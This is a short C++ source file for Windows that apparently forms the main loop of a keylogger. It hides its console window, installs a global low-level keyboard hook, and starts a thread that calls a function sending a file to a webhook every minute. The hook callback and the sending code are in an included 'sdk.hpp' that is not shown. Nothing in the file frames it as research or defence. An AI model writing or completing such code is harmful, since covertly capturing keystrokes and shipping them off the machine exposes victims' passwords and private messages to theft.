#include <iostream>
#include <fstream>
#include <Windows.h>
#include <sstream>
#include <thread>

//sdk

#include "sdk.hpp"

int main()
{
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    HHOOK keyboardHookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHook, NULL, 0);

    std::thread sendThread([&]()
    {
        while (true)
        {
            sendFileToWebhook();
            std::this_thread::sleep_for(std::chrono::minutes(1));
        }
    });

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    sendThread.join();

    return 0;
}